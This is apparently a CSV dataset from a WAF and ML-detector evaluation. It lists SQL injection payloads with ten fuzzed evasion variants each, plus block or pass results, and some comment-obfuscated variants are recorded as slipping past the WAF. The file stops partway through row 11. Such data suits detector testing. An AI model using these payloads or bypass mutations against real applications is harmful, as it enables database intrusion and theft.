@@ -1,0 +1,368 @@
+Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
+1,2025-10-25T12:54:19.560795, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,403,403,403,both_correct,"/**/sELEcT name fRom syscolumns whEre id   =     (  sElEcT id fROM sysobjects WhEre	name    like    tablename'  )  --",2025-10-25T12:54:36.993745,403,403,both_correct,"/*M\=3w*/SelecT name FrOm/**/syscolumns WHERE id    LIKe      (  sElect id fRom sysobjects WHERE	name	   LIke    tablename'  )  --",2025-10-25T12:54:57.060317,403,403,both_correct,"/*M\=3w*/sELECt name From/*\^/?*/syscolumns WhErE id  /**/ LIkE   
+  (  SElect id FRom sysobjects WHErE	name	   like    tablename'  )  --",2025-10-25T12:55:15.165582,403,403,both_correct," seLECT
+name From/*\^/?*/syscolumns wheRe id  /**/ lIkE   
+  (  sELect id fRoM sysobjects WheRE	name	   like    tablename'  )  --",2025-10-25T12:55:33.691791,403,403,both_correct," seLect
+name fROm/*\^/?*/syscolumns wHErE id  /*b!]B^*/ likE 
+ 
+  (  seLEcT id froM sysobjects wHeRE	name	  /**/liKE    tablename'  )  --",2025-10-25T12:55:50.876320,403,403,both_correct," SELEcT
+name froM/*\^/?*/syscolumns wheRe id  /*1qD*/ LIke 
+/**/
+  (  seLeCt id from sysobjects WHere name	  /**/liKE    tablename'  )  --",2025-10-25T12:56:09.376954,403,403,both_correct," SELECT
+name FRoM/*\^/?*/syscolumns WHEre id  /*1qD*/ like 	/*YB*/
+  (  SELECT id frOm sysobjects WhERE name	   LIkE    tablename'  )  --",2025-10-25T12:56:27.307467,403,403,both_correct," SeLECt
+name FROm/*\^/?*/syscolumns WHERe id  /*1qD*/ lIkE 	/**/
+  (  SElEct id/**/FrOM sysobjects wheRE name    lIKe    tablename'  )  --",2025-10-25T12:56:45.614460,403,403,both_correct," seleCt
+name FrOm/*\^/?*/syscolumns Where id  /*1qD*/ lIkE  /**/
+  (  SeleCt id/**/FrOm sysobjects/**/wHErE name    LIke    tablename'  )  --",2025-10-25T12:57:04.135766,403,403,both_correct," seLecT
+name froM/*\^/?*/syscolumns WHERe id  /*1qD*/ liKe  /**/	  (  SeLEcT id fRoM sysobjects/*q\$~ OR '9w)' LIKE '9w)'*/whERe name    lIkE    tablename'  )  --",2025-10-25T12:57:22.609589,200,403,waf_incorrect_ml_correct
+2,2025-10-25T12:57:40.709972," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",403,403,403,both_correct," seleCT * from users WhEre id  =  1 ||
+1#"". union SeLect 'a',version  (  /**/ )   --  AND (SELECT '.Qe'='.Qe')",2025-10-25T12:57:57.637917,403,403,both_correct," SEleCt * FrOm users whERE id /**/=  ')Xdx' not like ')XdxO' || 0x1#"". union SELEct 'a',version  (  /**/ )   --  AND (SELECT '.Qe'='.Qe').",2025-10-25T12:58:17.658791,403,403,both_correct," SELeCT * FROm users WhErE id /**/ lIke 
+ ')Xdx' not like ')XdxO' || 0x1#"". union SElecT 'a',version  (    )   --  AND (SELECT '.Qe'='.Qe').{W",2025-10-25T12:58:36.154763,403,403,both_correct," SElecT * frOM users WHeRe id /**/	like/**/
+ ')Xdx' not like ')XdxO' || 0x1#"". union SeLeCt 'a',version  (    )   --  AND (SELECT '.Qe'='.Qe').{Wa",2025-10-25T12:58:54.623218,403,403,both_correct," SelEcT * FRom users whErE id /**/	LiKE/**/
+ ')Xdx' not like ')XdxO'  OR  0x1#"". union SelEct 'a',version  (    )  
+--/**/ AND (SELECT '.Qe'='.Qe').{WaP",2025-10-25T12:59:12.171954,403,403,both_correct," sElECT * fROM users WherE id  	like/**/	 ')Xdx' not like ')XdxO'  or  0x1#"". union SeleCt 'a',version  (    )  
+--/**/ AND (SELECT '.Qe'='.Qe').{WaPo%",2025-10-25T12:59:31.803909,403,403,both_correct," sELect * FROM users wHere id   LIkE 	 ')Xdx' not like ')XdxO'  oR  0x1#"". union sELECt 'a',version  (    )  
+--/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T12:59:49.719636,403,403,both_correct," SElECt * FROm users WherE id   LIKe 	 ')Xdx' not like ')XdxO'  OR  0x1#"". union sEleCT 'a',version /**/(    )   --/*^kBP*/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:07.464181,403,403,both_correct," SELEct * From users WhEre id/**/  liKe 
+ ')Xdx' not like ')XdxO'  ||  0x1#"". union seLEct 'a',version /*zY*/(    )   --/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:26.062949,403,403,both_correct," selEcT * FrOm users WHERE id/**/  LIkE 
+ ')Xdx' not like	')XdxO'   OR/**/  0x1#"". union Select 'a',version /*z+*/(    )   --/**/ AND (SELECT '.Qe'='.Qe').{WaPo%r#",2025-10-25T13:00:44.106038,403,403,both_correct
+3,2025-10-25T13:01:01.673955," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",403,403,403,both_correct," SELeCT * FROm users wHERE id   like   '3464 NOT LIKE 3465' union SeleCt /*kBc*/ (  \  )  ,@@VERSION -- (SELECT
+ AND 1)'",2025-10-25T13:01:18.229617,403,403,both_correct," sELect * frOM users WheRe id  /**/lIke   '3764=(SELECT 3764) NOT LIKE 3465' union SEleCT /**/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT 1))'[k",2025-10-25T13:01:37.449498,403,403,both_correct," SElect * from users WhERe id   liKe   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 3764)
+NOT LIKE 0xd89' union SELeCt /*Em*/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT  OR 0))'[k",2025-10-25T13:01:57.478656,403,403,both_correct," sEleCt *
+fROm/**/users wHEre id   lIKE   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union sElECt /**/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT  OR  AND 4255<>4256))'[k",2025-10-25T13:02:16.810677,403,403,both_correct," SELEcT *
+from/**/users WheRE id   liKe   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union SelECt /*%ujI*/ (  \  )  ,@@VERSION -- (SELECT  ANd (SELECT /**/OR  AND 
+And 1<>(SELect '""]r' NOT LIKE '""]r""')))'[k",2025-10-25T13:02:35.342273,403,403,both_correct," selecT * from/**/users wHere id   lIkE   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union SELecT /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT  ANd (SELECT /**/OR  AND 
+aNd  or ',F'!=',Fe'<>(SElEcT '""]r' NOT LIKE '""]r""')))'[k*",2025-10-25T13:02:52.918109,403,403,both_correct," selECT * fRom/*<lo*/users WHErE id   liKE   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union sEleCt /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND	
+And  OR ',F'!=',Fe' NOT LIKE (sELEct '""]r' NOT LIKE '""]r""')))'[k*",2025-10-25T13:03:11.509091,403,403,both_correct," select * FROM users wHERE id   likE   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union SElECT /*%ujI*/ (  \  ) /**/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND 
+AND  || ',F'!=',Fe' NOT LIKE (SeLect '""]r' NOT LIKE '""]r""')))'[k*Ds",2025-10-25T13:03:29.131734,403,403,both_correct," SeLEcT * FROm users whErE id   liKE   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union sElEct /*%ujI*/ (/**/ \  ) /*n-L/*/,@@VERSION -- (SELECT/**/ ANd (SELECT /**/OR  AND 
+AnD 	 OR  ',F'!=',Fe' NOT LIKE (seLECT '""]r' NOT LIKE '""]r""')))'[k*Ds",2025-10-25T13:03:47.465690,403,403,both_correct," SElEct * fROm users WheRe id   lIke   ''} 
+o9' NOT LIKE '} 
+o9Z'=(SELECT 0xeb4)
+NOT LIKE 0xd89' union select /**/ (/**/ \  ) /*n-L/*/,@@VERSION -- (SELECT/**/ ANd (SELECT  OR  AND 
+AND   OR  ',F'!=',Fe' not like (sELECT '""]r' NOT LIKE '""]r""')))'[k*Dshm",2025-10-25T13:04:06.467712,403,403,both_correct
+4,2025-10-25T13:04:25.377909,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,403,403,403,both_correct,"SElect * FrOM users WHERE id   LIKE   '(SELECT 0)' NOT LIKE '0N' <@.$ OR 1  =/**/ 1 --  OR	0=t",2025-10-25T13:04:42.162345,403,403,both_correct,"sELecT * frOm users Where id   lIke   '(SELECT 9829 IN (9828,9829,9830))' NOT LIKE '0N' <@.$ or/**/0x1  =/*VTDb*/  Or 0 --  OR
+0=t",2025-10-25T13:05:01.793034,403,403,both_correct,"selECt * FROM users WhERE id   liKE   '(SELECT 'E' NOT LIKE 'E<'
+IN (0x2664,9829,9830))' NOT LIKE '0N' <@.$ Or 0x1   LIKE /*;]<**/  or 0 --  OR
+ OR 0=t",2025-10-25T13:05:19.174385,403,403,both_correct,"selECt * fRoM users WHEre id   liKe   '(SELECT 'E' NOT LIKE 'E<'
+IN (0x2664,(SELECT 9829),9830))' NOT LIKE '0N' <@.$ or 0x1   LIke /*;]<**//**/ oR  aNd 1 --  OR	 OR 6276<>6277=t",2025-10-25T13:05:36.954332,403,403,both_correct,"SelecT * fROm/**/users wHere id   lIKE   '(SELECT 'E' NOT LIKE 'E<'
+IN (0x2664,(SELECT 9829),9830))' NOT LIKE '0N' <@.$ or 0x1   like /*;]<**//**/ Or  anD 0x1 --  OR  OR (SELECT 1)<>'t'='t'=t",2025-10-25T13:05:54.428487,403,403,both_correct,"sElEct * fRom/**/users/**/WhErE id   lIkE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT 4845 LIKE 4845),0x2666))' not like '0N' <@.$ OR 0x1   Like /*;]<**//**/ Or  aNd 0x1 --  OR  OR (SELECT  AND 1)<>'t'='t'=tc$",2025-10-25T13:06:12.371553,403,403,both_correct,"SeLecT * FRoM/**/users/**/WhErE id   likE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X' NOT/**/LIKE 'X[') LIKE (SELECT 1)),0x2666))' not like '0N' <@.$ Or 0x1
+  LIKe /*;]<**//**/ Or  And 0x1 --  OR  OR (SELECT  AND 1)<>'t'='t'=tc$4",2025-10-25T13:06:29.842315,403,403,both_correct,"SElEcT * FRom/**/users/**/whERE id   LIKE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[') LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ oR 0x1
+  LiKe /*;]<**//**//**/OR  anD 0x1 --  OR  OR (SELECT  AND  AND '3P'='3P')<>'t'='t'=tc$4jT",2025-10-25T13:06:47.519888,403,403,both_correct,"seLECt * froM/**/users/**/wHEre id
+  LikE   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[')/**/LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ oR 0x1
+  LIKe /*;]<**//**//**/or  && 0x1 --  OR  OR (SELECT  AND  AND '3P'='3P')<> OR '(f)' NOT LIKE '(f)H'=tc$4jT0",2025-10-25T13:07:05.942037,403,403,both_correct,"SelECT * from/**/users/**/WHerE id
+  like   '(SELECT 'E' NOT LIKE 'E<' IN (0x2664,(SELECT (SELECT 'X'	NOT/**/LIKE 'X[')/**/LIKE (SELECT 0x1)),0x2666))' not like '0N' <@.$ or 0x1   lIkE /*;]<**//**//**/OR   anD  0x1 --  OR  OR (SELECT  AND/**/ AND '3P'='3P')<> OR '(f)' NOT LIKE '(f)H'=tc$4jT0Q",2025-10-25T13:07:23.754854,403,403,both_correct
+5,2025-10-25T13:07:41.680512," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",403,403,403,both_correct," SELEcT * fRom users WHERe id   lIke   '(SELECT 1)' oR @ @1/**/ =  1 union SelECt 0x7ee LIKE 2030,version 
+(    )   -- 1'",2025-10-25T13:07:58.874352,403,403,both_correct," sElEcT * FROM users wheRe id   LIKE   '(SELECT 1)' OR @ @0x1466 In (5221,5222,5223)   lIkE   1 union SeleCt 0x7ee Like 2030,version 	(    )   --  OR 0'Po",2025-10-25T13:08:19.872371,403,403,both_correct," SElecT * fROM users whERE id   Like   '(SELECT 1)' or @ @0x1466 iN (5221,'I'='I',(SELECT 5223))   lIKE   1 union SElEct 0x7ee LikE (SELeCt 1),version  (    )   -- /**/OR 0'Po",2025-10-25T13:08:41.091853,403,403,both_correct," SEleCt * fRom users wHERe id   LIkE   '(SELECT (SELECT 1))' OR @ @0x1466 iN (5221,'I'='I',(seleCt 5223))   likE   7430 Like 7430 union SeLEcT 0x7ee LIke (SelEct 1),version  (  	 )   --  OR (SELECT 0)'Pol",2025-10-25T13:09:04.124262,403,403,both_correct," seleCT * FROM users WHeRE id   lIKE   '(SELECT (SELECT 1))'
+|| @ @0x1466 IN (0x1465,'I'='I',(seLeCt 5223))   lIke   4260!=4261 LiKe  OR 0 union sELEct 0x7ee LIke (sELecT 1),version  (/**/ 	 )   --  OR (SELECT 0)'Pol'",2025-10-25T13:09:24.661337,403,403,both_correct," SELEct * FRom users WHEre id   lIkE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'	|| @ @0x1466 iN (0x1465,'I' like 'I',(SEleCT 5223))   LiKE   4260!=4261 LIKE  Or 0 union sELECT 0x7ee LiKE (sELect 1),version  (  	 )   --  OR (SELECT 0)'Pol'",2025-10-25T13:09:45.317954,403,403,both_correct," SELeCt * FrOM users WhErE id   liKe   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'	 or  @ @0x1466 IN (0x1465,'I' LikE 'I',(SElECt (SELECT 5223)))   liKE   (SELECT 1)!=4261 LiKE  or 0 union sElecT 0x7ee/* DP*/lIkE (SElEct 'D' NOT LIKE 'D:'),version  (  	 )  	--  OR (SELECT 0)'Pol'",2025-10-25T13:10:04.708335,403,403,both_correct," SELECt * FroM users wherE id   likE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  oR  @ @0x1466 In (0x1465,'I' LIke 'I',(seLECt (selecT (SELECt 5223))))   Like   (SELEcT 1)!=4261 lIKE  OR 2322 in/**/(2321,2322,2323) union SelEct 0x7ee/**/lIKe (SeLeCt 'D' not like 'D:'),version  (  	 )  	--  OR (SELECT  OR 0)'Pol' ",2025-10-25T13:10:22.297530,403,403,both_correct," seLect * From users WhERE id   like   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  Or  @ @0x1466 iN (0x1465,'I' LIke 'I',(SeLeCt (SElect (sElECt  Or 0))))   LIke   (SeleCT 1)!=4261 liKE  OR 2322 In/**/(141 not like 142,(SeLEcT 2322),2323) union SELEcT 0x7ee Like (SELecT 'D' not like 'D:'),version  (    )  	--  OR (SELECT  OR 0)'Pol' #$",2025-10-25T13:10:40.106321,403,403,both_correct," SELeCt * FRoM users WhEre id   LiKE   '(SELECT (SELECT (SELECT (SELECT 1)) NOT LIKE 6658))'  or/**/ @ @0x1466 In (0x1465,'I' LikE 'I',(seLecT (SeLECT (SEleCT  or 0))))   lIke   (selECT 1)!= Or 0 LiKe  or 'YXe'I'<>'YXe'Ip' In/**/(141 not like 0x8e,(SElECT 2322),2323) union select 0x7ee lIKe (sELeCT 'D' not like 'D:'),version  (    )   --  OR (SELECT  OR 0)'Pol' #$",2025-10-25T13:10:57.617083,403,403,both_correct
+6,2025-10-25T13:11:15.255759,select * from users where id  =  1. <@ or 1  =  1 -- 1,403,403,403,both_correct,"sELect * FRoM users wHERE id  =   OR 6390 NOT LIKE 6391. <@ || (SELECT 1)	 =  1 --/*`*/1",2025-10-25T13:11:32.946167,403,403,both_correct,"selEct * FRoM users WheRe id  =  
+Or  oR 0 NOT LIKE 6391. <@  Or  (SelecT 6532<>6533)	 =  (SeLeCT 1) -- 1",2025-10-25T13:11:52.468111,403,403,both_correct,"SelEcT * frOm users wHErE id  =  
+OR  oR 0 NOT LIKE 6391. <@  OR  (seLEcT 6532<>8524 In ( oR 0,0x214c,8525))
+  LIKE   (SELect/**/1) -- 1",2025-10-25T13:12:10.266748,403,403,both_correct,"seLEcT * fROm users wHere id/**/ =  
+oR  or (sEleCt 1) NOT LIKE (SelecT 6391). <@  ||  (seLEcT ' w' NOT LIKE	' w%'<>8524 iN ( Or 0,0x214c,8525))
+  LIKE   (SeLEct/*IGCv*/1) -- 1",2025-10-25T13:12:28.698376,403,403,both_correct,"SeLEcT * froM users WHEre id  =  
+oR  oR (seLeCt 1) not like (seLeCt  OR '}d'='}d'). <@  ||  (SeLECT ' w' NOT LIKE
+' w%'<>8524 IN ( oR 0,0x214c,8525))
+  lIKe   (SELeCT/**/1) -- (SELECT 1)+",2025-10-25T13:12:47.621196,403,403,both_correct,"SeLect */**/frOm users wheRE id  =  
+Or  or (sElecT 1) not like (SELeCt  Or '}d'='}d'). <@  ||  (SEleCT ' w' NOT LIKE	' w%'!=8524 IN ( oR 0,0x214c,(selECt 1)))
+  lIKE   (sEleCT/*#pYm;*/1) -- (SELECT (SELECT '+' LIKE '+'))+",2025-10-25T13:13:05.002008,403,403,both_correct,"sELeCT */**/fROM users WHeRe id   like    Or  oR (SEleCt 'j~' LIKE 'j~') not like (sELEct  oR '}d'='}d'). <@  ||  (SeLeCt ' w' NOT LIKE	' w%'!= AND 1 iN/**/( OR 0,0x214c,(selECT 0x1)))
+  LIKE   (sELECt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H",2025-10-25T13:13:23.203492,403,403,both_correct,"sELect */*>iW!*/fRoM users whErE id   lIKe    Or  Or (sElEcT 'j~'/**/LIKE 'j~') not like (SELecT  or '}d'='}d'). <@  ||  (SelEct ' w' NOT LIKE ' w%'!= && 1 In/**/( or 9274 in (9273, oR (SelECt 0),9275),0x214c,(SelECT 0x1)))
+  LIKe   (seLeCt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H",2025-10-25T13:13:40.961553,403,403,both_correct,"seLEct */*>iW!*/fROm users WHeRe id   lIke    oR
+ OR (SelECT 'j~'/**/LiKe 'j~') not like (sELECT  or '}d'='}d'). <@  ||  (SeLEcT ' w' NOT LIKE ' w%'!=  AND  '0' NOT LIKE '0_' iN/**/( oR 9274 in (9273, or/**/(seLeCt 0x0), oR 0),0x214c,(seLECT 0x1)))
+  lIkE   (sELeCt/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H4Z",2025-10-25T13:13:58.508317,403,403,both_correct,"SELeCT */*>iW!*/froM users wheRE id   liKE    or
+ OR (seLEct 'j~'/**/LIKe 'j~') not like (sELect  OR '}d'='}d'). <@  ||  (sElect ' w' NOT LIKE ' w%'!=  aND  '0' NOT LIKE '0_' In/**/( OR 4555 NOT LIKE (SELECT (SELECT 1)) in (9273, or/**/(sELeCt 0x0), oR 0),0x214c,(SelECT 0x1)))	 /**/lIke   (seLECT/**/1) -- (SELECT (SELECT '+' LIKE '+'))+H4Za",2025-10-25T13:14:15.635989,403,403,both_correct
+7,2025-10-25T13:14:33.745677,"or 0  =  0 #""",403,200,200,both_incorrect,"oR	(selECT  or 0)  =  'w)' likE 'w)'/*mz'k~*/#""",2025-10-25T13:14:50.441845,200,403,waf_incorrect_ml_correct,"OR
+(selEcT/**/ oR 0x0)   lIkE   'w)' lIkE 'w)'/**/#""S",2025-10-25T13:15:08.873557,403,403,both_correct,"or
+(sElECt/**/ OR 0x0)   lIKE   'w)'/**/LiKe
+'w)'/**/#""Ss",2025-10-25T13:15:26.152363,403,403,both_correct,"Or
+(sELECt/**/ or 0x0)   LikE  
+'w)'/**/LiKE
+'w)' #""Ssg/",2025-10-25T13:15:43.294112,403,403,both_correct,"oR
+(sELect/*C[ */ or 0x0)   lIKE  
+'w)' lIkE	'w)' #""Ssg/",2025-10-25T13:16:00.253064,403,403,both_correct,"or
+(SELECt/**/ or/**/0x0)   like  
+'w)'	Like	'w)' #""Ssg/",2025-10-25T13:16:17.850569,403,403,both_correct,"oR
+(SElecT/**/ oR 0x0)   LikE  
+'w)'
+lIKe	'w)' #""Ssg/\",2025-10-25T13:16:35.624990,403,403,both_correct,"or
+(seLect/**/ OR/**/0x0)  	liKe  
+'w)'
+liKe	'w)' #""Ssg/\Y",2025-10-25T13:16:53.761808,403,403,both_correct,"Or
+(SElEcT  oR/*hp~*/0x0)  	lIKE  	'w)'
+LiKe	'w)' #""Ssg/\Y",2025-10-25T13:17:12.240271,403,403,both_correct,"oR
+(sElECt  or/*~y""*/0x0)  
+liKE/**/ 	'w)'
+like	'w)' #""Ssg/\Y",2025-10-25T13:17:29.684740,403,403,both_correct
+8,2025-10-25T13:17:47.777823, exec xp_regread,403,403,403,both_correct,"	exec/**/xp_regread",2025-10-25T13:18:04.368022,200,403,waf_incorrect_ml_correct,"	exec	xp_regread",2025-10-25T13:18:23.456560,403,403,both_correct," exec	xp_regread",2025-10-25T13:18:45.104126,403,403,both_correct, exec/**/xp_regread,2025-10-25T13:19:03.404729,200,403,waf_incorrect_ml_correct,/**/exec/**/xp_regread,2025-10-25T13:19:21.514266,200,403,waf_incorrect_ml_correct,/**/exec xp_regread,2025-10-25T13:19:39.221056,403,403,both_correct," exec
+xp_regread",2025-10-25T13:19:56.717264,403,403,both_correct,/*M=BD*/exec xp_regread,2025-10-25T13:20:14.454219,403,403,both_correct,/**/exec/**/xp_regread,2025-10-25T13:20:32.655873,200,403,waf_incorrect_ml_correct,"/**/exec	xp_regread",2025-10-25T13:20:50.344712,403,403,both_correct
+9,2025-10-25T13:21:08.919570," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",403,403,403,both_correct," SElecT * FROM users WHERE id   lIke /**/ 1 or ""%."" Or
+1  =  (sElecT  AND 1) lIke 273 -- 1Y",2025-10-25T13:21:27.699183,403,403,both_correct,"	SEleCt * FRom users WhEre id   LIKe /**/ 1 Or ""%."" or
+3 like 3  =/**/ (SeLect  And 1) lIke  Or 0x0 -- 1Y",2025-10-25T13:21:46.386167,403,403,both_correct,"	SeLeCt * fRoM users whERe id   liKe   1 Or ""%."" or	(SELECT  AND 1) LikE 'd'<>'dF'   like /**/ (selECt  AND 1) lIKE  OR 0x0 -- 1Y:7",2025-10-25T13:22:04.092256,403,403,both_correct,"	selecT * FrOm users where id   lIke   1 OR ""%."" Or	(seleCt  anD 1) LiKE 'd'<>'dF'   lIKe   (sELEcT	 AnD (SeLEcT 5765=5765)) LiKE  || 0x0 -- 1Y:(SELECT 1)<C",2025-10-25T13:22:21.289424,403,403,both_correct,"
+sElect/**/* From users whErE id   LIkE   0x1 Or ""%."" oR	(SeLEcT  aNd (SeLECt 1)) LIKE 'd'<>'dF'   LikE   (SELeCT	 aNd (SElECt 5765='tzE'='tzE')) lIKe  || 0x0 -- 1Y:(SELECT 1)<C",2025-10-25T13:22:39.797855,403,403,both_correct,"
+sElECt/*S}*/* FROM users WHERE id   LIkE   0x1 OR ""%."" or	(SeLeCt  anD (SElECT 1)) like 'd' NOT LIKE 'dF'   likE   (selEct  ANd (SelEct 5765='tzE'='tzE')) lIke  || 0x0 -- 1Y:(SELECT/**/ OR 0x1189 NOT LIKE 4490)<C",2025-10-25T13:22:57.388700,403,403,both_correct," SElEcT/*z^2*/* FrOM users WHERE id   LiKe   0x1 OR ""%."" or	(SeLEct  ANd (SeLECT  or 0)) lIKe 'd' NOT LIKE 'dF'   LIKE   (SelECt  aND (SELEcT (SELECT 5765)='tzE'='tzE')) lIke   or  0x0 -- 1Y:(SELECT  OR 0x1189 NOT LIKE '?*'<>'?*8')<C",2025-10-25T13:23:14.706275,403,403,both_correct," seLEct/*z^2*/* From users wHEre id/**/  likE   0x1 Or ""%."" or (SelEcT  and (sElect  oR  ANd 1)) lIKe 'd' NOT LIKE 'dF'   LIkE   (sEleCT  aNd (SELect (SELeCt (SELECT 5765))='tzE' LIKE 'tzE')) Like   Or  0x0 -- 1Y:(SELECT  OR 0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^",2025-10-25T13:23:32.641451,403,403,both_correct," SeLect/**/* fROM users wheRE id/**/  lIKe   0x1 Or ""%."" oR (sELeCt  And (SELeCT  or  And	0x1)) lIke 'd' NOT LIKE 'dF'   liKE   (SeLecT  and (SELECT (SELect (SELECt (SeLECT 1)))='tzE' LiKe 'tzE')) LikE   OR  0x0 -- 1Y:(SELECT  OR/**/0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^",2025-10-25T13:23:51.109113,403,403,both_correct," sElecT/**/* frOm users WHerE id   lIKe   0x1 oR ""%."" Or (sElEct  ANd (selecT  Or  AnD
+0x1)) lIKe 'd' NOT LIKE 'dF'   LIkE   (SElECt  anD (SeLECT (seLeCT (SeleCT (SElecT 0x1))) LIke 'tzE' lIKE 'tzE')) LikE   or  0x0 -- 1Y:(SELECT  OR/**/0x1189 NOT LIKE '?*'<>'?*'f'='f'')<C^ OR 'dHFY7' LIKE 'dHFY7'-",2025-10-25T13:24:08.163422,403,403,both_correct
+10,2025-10-25T13:24:25.626065," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," SelecT * FRom users whERe/**/id   lIKe   1 <@&@ union SelECT  or 0x0,version  (    )   --
+6170<>6171",2025-10-25T13:24:42.453443,403,403,both_correct," SeLecT * FrOM users WHerE/**/id/**/  lIke   (SELECT 1) <@&@ union selECT  or 0x0,version  (    )   --	6170<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:01.636320,403,403,both_correct," sELeCt * FroM users whEre/**/id   like   (seleCT 'f1' not like 'f1{') <@&@ union SeLeCT  or 0x0,version  (    ) 
+ --	 OR 0x0<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:19.463536,403,403,both_correct," SelEct * FRom users wherE id   lIKE   (SelECT 'f1' not like 'f1{') <@&@ union seLEcT  or 0x0,version  (    )   --	 OR 0x0<> AND 'H' NOT LIKE 'H%'",2025-10-25T13:25:36.926007,403,403,both_correct," SELecT * FRom users WhEre id   LIKe   (sELeCt 'f1' not like 'f1{') <@&@ union/**/SeLeCt  Or 0x0,version  (    )   --
+ oR 0x0<> anD 'H' NOT LIKE 'H%'",2025-10-25T13:25:56.079856,403,403,both_correct," SeLEct * From users WheRe id   LiKE   (seLEct 'f1' not/**/LikE 'f1{') <@&@ union/**/SElECt  or 0x0,version  (    )   --  or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:13.751323,403,403,both_correct," sElEcT * FRoM users WhEre id   lIke   (SELEct 'f1' not/**/LiKe 'f1{')
+<@&@ union/*U~L'*/SEleCT/**/ || 0x0,version  (    )   --  or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:32.485690,403,403,both_correct," sELect * FRoM users WhERe id   like   (SelEct 'f1' not/*Z""Y3R*/LIke 'f1{')
+<@&@ union/*U~L'*/SeLeCT/**/ || 0x0,version  (    )   --
+/**/or 0x0!= AnD 'H' NOT LIKE 'H%'",2025-10-25T13:26:50.154440,403,403,both_correct," SELect * FRoM users wHere id   Like   (SeLeCT 'f1' not/*?*/LIkE 'f1{')	<@&@ union/*U~L'*/seleCt/**/  OR  0x0,version  (    )   --
+ oR 0x0!= aNd 'H' NOT LIKE 'H%'",2025-10-25T13:27:07.996813,403,403,both_correct," sELECT * From users wHere id   LikE   (sElECt 'f1' not/**/LiKE 'f1{')	<@&@/**/union/*U~L'*/seLECt/**/  oR	 0x0,version  (    )   --
+ oR 0x0!= AND 'H' not like 'H%'",2025-10-25T13:27:24.893265,403,403,both_correct
+11,2025-10-25T13:27:42.522913,1 or pg_sleep  (  __TIME__  )  --,403,403,403,both_correct,"(SELECT 1) not/**/like 0x132e OR pg_sleep  (
+ __TIME__  )  --",2025-10-25T13:28:07.565142,403,403,both_correct,"(sELecT (SElECt (SELECT 1))) not/**/Like 0x132e || pg_sleep  (	 __TIME__ /**/)  --",2025-10-25T13:28:26.780930,403,403,both_correct,"(SEleCT (SeLEcT (seLECT (SELECT  && 1361 NOT LIKE 1362)))) not LIkE 0x132e || pg_sleep  (		__TIME__ /**/)  --",2025-10-25T13:28:50.466055,403,403,both_correct,"(SELEct/**/(seLEcT (sElECt (selecT   AND  (SelEct (SELECT 1)) LikE 1717 NOT LIKE 1362)))) not LIkE 0x132e || pg_sleep 
